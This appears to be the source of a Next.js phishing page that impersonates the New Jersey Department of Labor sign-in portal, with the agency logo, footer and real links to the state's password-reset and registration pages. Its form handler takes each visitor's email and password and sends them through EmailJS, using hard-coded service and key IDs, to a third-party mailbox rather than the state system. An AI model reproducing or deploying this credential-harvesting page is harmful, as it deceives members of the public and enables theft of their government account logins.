import Link from 'next/link';
import styles from '../styles/Home.module.css';
import emailjs from 'emailjs-com';
import { useRef } from 'react';

const Home = () => {
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();
        emailjs.sendForm(
            'service_ozea06x',      // replace with your EmailJS service ID
            'template_ugtxhw6',     // replace with your EmailJS template ID
            form.current,
            'XMOnwjyzQDoRVRYl3'          // replace with your EmailJS public key
        ).then(
            (result) => {
                alert('Form sent!');
            },
            (error) => {
                alert('Error sending form');
            }
        );
    };

    return (
        <div className={styles.container}>
            {/* Logo Section */}
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>

            {/* Login Form Section */}
            <div className={styles.formSection}>
                <form className={styles.loginForm} ref={form} onSubmit={sendEmail}>
                    <h2 className={styles.heading}>Sign in using your email</h2>
                    <input
                        type="text"
                        id="email"
                        name="user_email"
                        placeholder="Please enter your email as username"
                        className={styles.input}
                        required
                    />
                    <input
                        type="password"
                        id="password"
                        name="user_password"
                        placeholder="Password..."
                        className={styles.input}
                        required
                    />
                    <div className={styles.rememberMe}>
                        <input
                            type="checkbox"
                            id="rememberMe"
                            name="remember_me"
                            className={styles.checkbox}
                        />
                        <label htmlFor="rememberMe">Remember my username</label>
                    </div>
                    <button type="submit" className={styles.button}>
                        Login
                    </button>
                </form>

                {/* Options Section */}
                <div className={styles.options}>
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#passwordReset/" legacyBehavior>
                        <a>Forgot Password</a>
                    </Link>
                   
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#forgotUsername/" legacyBehavior>
                        <a>forgot username</a>
                    </Link>
                </div>
                <div className={styles.horizontalDivider}></div>
                <div className={styles.signupRow}>
                    <span>New here? </span>
                    <Link href="https://secure.dol.state.nj.us/sso/XUI/?realm=njcc#register/">
                        create account
                    </Link>
                </div>
            </div>
            {/* Footer Section (Fixed at the Bottom) */}
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Home;